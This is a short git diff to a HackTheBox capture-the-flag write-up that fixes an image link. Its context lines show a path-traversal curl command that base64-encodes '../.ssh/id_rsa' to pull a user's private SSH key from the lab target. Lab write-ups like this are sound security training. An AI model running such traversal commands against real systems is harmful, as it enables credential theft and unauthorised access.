@@ -226,7 +226,7 @@ So in order to read `berlin`'s private SSH key we can run something like this:
 curl -k https://lacasadepapel.htb/file/$(echo -n "../.ssh/id_rsa" | base64) > berlin_id_rsa
 ```
 
-![key-24](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/LaCasaDePapel/img/emcode-24.png)
+![key-24](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/LaCasaDePapel/img/key-24.png)
 
 
 From here, I try to log in to the SSH as `berlin` but it prompts me for a password:
